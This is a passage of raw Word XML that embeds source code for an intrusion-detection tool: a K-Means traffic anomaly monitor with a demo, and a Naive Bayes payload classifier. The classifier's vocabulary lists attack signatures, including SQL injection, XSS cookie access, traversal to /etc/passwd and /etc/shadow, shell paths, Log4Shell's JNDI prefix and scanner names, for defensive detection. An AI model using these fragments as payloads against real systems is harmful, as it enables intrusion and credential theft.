          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="216AD00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export_brain(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BBE07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{"k": self.k, "alpha": self.alpha, "centroids": self.centroids,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579FA8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"dist_count": self.dist_count, "dist_mean": self.dist_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23028F0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"dist_m2": self.dist_m2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3434BA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"cluster_counts": self.cluster_counts}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E8A534" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2916994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import_brain(self, data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="630212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"centroids" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618D9C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self.centroids = data["centroids"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BBF9C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self.k = len(self.centroids)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166A53B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tolerate brains saved before distance stats were tracked</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081A2F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self.dist_count = int(data.get("dist_count", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA5DEC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self.dist_mean = float(data.get("dist_mean", 0.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495FEA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self.dist_m2 = float(data.get("dist_m2", 0.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA5E7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self.cluster_counts = list(data.get("cluster_counts",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB2E33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[0] * self.k))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC2F6D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while len(self.cluster_counts) &lt; self.k:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618566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self.cluster_counts.append(0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55AFDF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State import: K-Means loaded %d centroids."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="571DBA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len(self.centroids))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A8845D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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48EB5F2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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08AE6185" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24DFD295" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="399E588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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB5ED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km = KMeansMonitor(k=3, learning_rate=0.1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00551C85" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C33BE4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learn what "normal" looks like for this host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4817B13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print("warm-up on 20 seconds of idle traffic")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF56F4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 in range(20):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BAE5C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km.analyse(10 + (i % 3), 2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E0D440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 sd = km.distance_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF89B3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nearest-centroid distance: mean=%.3f std=%.3f over %d samples"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656837F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(m, sd, km.dist_count))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A370F03" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D47C6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print("\nnow score traffic the host has never seen:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259AB3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pps, ports, note in [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE9C5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(11, 2, "more idle traffic"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3537CD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(60, 45, "moderate scan-like spread"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38CBA1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(9000, 1, "massive flood"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770CAF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(300, 400, "wide port sweep"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA2F4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2807C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 = km.analyse(pps, ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="262AEC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pps=%-5d ports=%-4d -&gt; %-12s anomaly=%-5s dist=%.1f thr=%.1f"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57CD45F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(pps, ports, v.label, v.is_threat,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79027F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v.detail["distance"], v.detail["threshold"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDE8EB9"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src/engines/naive_bayes.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4816363C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>300 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172B6C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math</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E84FEC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="264EF66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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5006B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from engines.base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1E7BE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except ImportError:  # allow `python engines/naive_bayes.py` direct execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F83926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from base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25943237" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="415735D5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49B8FB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Seed vocabulary, grouped by attack family.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="589B16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word -&gt; (P(word|malicious), P(word|safe))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B1744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42C5EE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The original twelve SQL-oriented tokens missed other common payload attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4C4B6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families. This vocabulary also covers cross-site scripting, path traversal,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF4FD0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command injection, template injection, deserialisation, and scanner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="449C4D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fingerprints.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B66B9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6EF45C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Tokens were chosen for discriminative power rather than volume. Substrings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7FFE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that occur in ordinary traffic are deliberately excluded - "curl" and "wget"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C65FA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for instance appear in legitimate User-Agent headers, so treating them as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3537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malicious would trade recall for a large false-positive count.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A2179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DEFAULT_LIKELIHOODS = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="306FA1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SQL injection ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459DD8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"UNION":            (0.80, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539919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"SELECT":           (0.85, 0.0500),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33705B9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"UNION ALL":        (0.90, 0.0005),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7875604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"OR 1=1":           (0.95, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49FC64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"OR '1'='1":        (0.95, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72AD5B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"SLEEP":            (0.60, 0.0100),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA267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"BENCHMARK(":       (0.88, 0.0002),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145CB15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"WAITFOR DELAY":    (0.92, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430D27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"INFORMATION_SCHEMA": (0.93, 0.0002),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AADAC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"GROUP_CONCAT":     (0.85, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23CC18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"XP_CMDSHELL":      (0.96, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C1DA2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"DROP":             (0.40, 0.0200),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DA99F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"INSERT":           (0.50, 0.0500),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6751F2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"UPDATE":           (0.50, 0.0500),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC46078" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01B5B74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cross-site scripting ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334611C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"SCRIPT":           (0.70, 0.0200),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22244B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"ALERT(":           (0.80, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65696AD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"ONERROR":          (0.85, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183497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"ONLOAD":           (0.75, 0.0050),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B1F5D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"&lt;IMG":             (0.60, 0.0300),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A31E23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"&lt;SVG":             (0.80, 0.0020),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BF79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"JAVASCRIPT:":      (0.82, 0.0020),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB3347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"DOCUMENT.COOKIE":  (0.94, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F03B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"PROMPT(":          (0.78, 0.0020),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761B22E8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A171E4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path traversal / local file inclusion ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F0AD1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"/ETC/PASSWD":      (0.90, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="332DCA9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"/ETC/SHADOW":      (0.95, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC0C3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           (0.88, 0.0020),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44158F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"..%2F":            (0.92, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3B75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"%2E%2E%2F":        (0.92, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260781E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"/PROC/SELF":       (0.90, 0.0002),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090EEAD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"BOOT.INI":         (0.88, 0.0002),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C52DF05" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="324271C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command injection ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A1474A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"/BIN/SH":          (0.90, 0.0005),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCCFB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"/BIN/BASH":        (0.88, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD256E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";CAT ":            (0.85, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F5C94C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"|CAT ":            (0.85, 0.0010),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC4DE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(0.55, 0.0300),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="748A5C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"CHMOD ":           (0.60, 0.0100),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFEE90F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="203FE6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template / expression injection (incl. Log4Shell) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E676A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"${JNDI:":          (0.97, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705DB0E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"{{7*7}}":          (0.95, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="555838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"&lt;%=":              (0.70, 0.0050),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3478A0F5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12C3B32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scanner and tooling fingerprints ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78BD3C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"SQLMAP":           (0.96, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EB8B1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"NIKTO":            (0.95, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6E26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"ACUNETIX":         (0.95, 0.0001),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B8AB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"NESSUS":           (0.93, 0.0002),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4197671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"MASSCAN":          (0.90, 0.0002),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685A1220" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="627647B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weak signals: informative but common in ordinary traffic ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EAB100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"ROOT":             (0.30, 0.0800),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3391B0E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"ADMIN":            (0.40, 0.1000),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773BA2B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45DD6347" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="593661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These words occur in ordinary URLs, usernames, documentation, and service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1650DD1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banners. They may add context to a real exploit signature, but must never be</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373F7D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sufficient to raise a payload alert on their own - even if an imported model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C31FA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assigned them an overconfident likelihood.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DA2B3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WEAK_SIGNALS = {"ROOT", "ADMIN"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15DF0A90" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28A4E54B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58FD43D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PayloadMonitor(DetectionEngine):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071F6D0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"""Multinomial Naive Bayes over payload tokens.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA6D061" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2994F8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Scoring is done in log space rather than by multiplying probabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530D0E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 payload matching a dozen tokens would otherwise multiply a dozen values</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36F6F3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below 0.01 and underflow to exactly 0.0 in IEEE-754 double precision,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF029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making the two class scores indistinguishable (this was bug B-02).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A78609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Summing logarithms is monotonically equivalent and numerically stable:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671E7FC8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="181910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log P(class|payload) ~ log P(class) + SUM log P(token|class)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1493EC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9E52573" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36DA67A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name = "naive_bayes"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C802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features = ("payload_bytes",)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B141015" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BB9E8F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__init__(self, confidence_threshold=0.80):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162A54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10/90 prior - rough guess at malicious vs safe in mixed traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F0ACE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self.prior_malicious = 0.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C268DE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self.prior_safe = 0.90</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1E012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self.confidence_threshold = confidence_threshold</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701E0349" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A70FF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word -&gt; (P(word|malicious), P(word|safe))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C05E42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self.likelihoods = dict(DEFAULT_LIKELIHOODS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390F9207" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2561DDC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used by smoothing if we ever score unseen words</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3686D1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self.default_malicious_likelihood = 0.001</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1A0EE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self.default_safe_likelihood = 0.01</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BBBCB3B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E70593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export_brain(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071AA6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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2482FB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"prior_malicious": self.prior_malicious,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF79E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"prior_safe": self.prior_safe,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698904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"likelihoods": {k: list(v) for k, v in self.likelihoods.items()},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4872CE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76DAF81" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45F2F0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import_brain(self, data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="140DF6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isinstance(data, dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76BEB4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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1CB3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"prior_malicious" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212509D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self.prior_malicious = float(data["prior_malicious"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F6BCA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"prior_safe" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B0BD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self.prior_safe = float(data["prior_safe"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F70CE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"likelihoods" in data and isinstance(data["likelihoods"], dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459BEC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new = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D973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w, pair in data["likelihoods"].items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76310AA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5273A7D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new[w.upper()] = (float(pair[0]), float(pair[1]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FB2CB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(TypeError, ValueError, IndexError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F020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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E20B5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new:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E96AE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self.likelihoods = new</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B800A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State import: Naive Bayes loaded %d keyword likelihoods."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFEF35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len(self.likelihoods))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CA52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return True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34CD040C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="382115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classify(self, payload_bytes):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684790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1C6F8A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payload = payload_bytes.decode("utf-8", errors="ignore").upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E247A3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Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5871E5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"Safe", 0.0, []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248AB914" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78EAFD8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len(payload) &lt; 3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0DB00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"Safe", 0.0, []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A282550" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="612C3D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log_mal = math.log(self.prior_malicious)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79342D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log_safe = math.log(self.prior_safe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B265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found = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13FB4E45" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
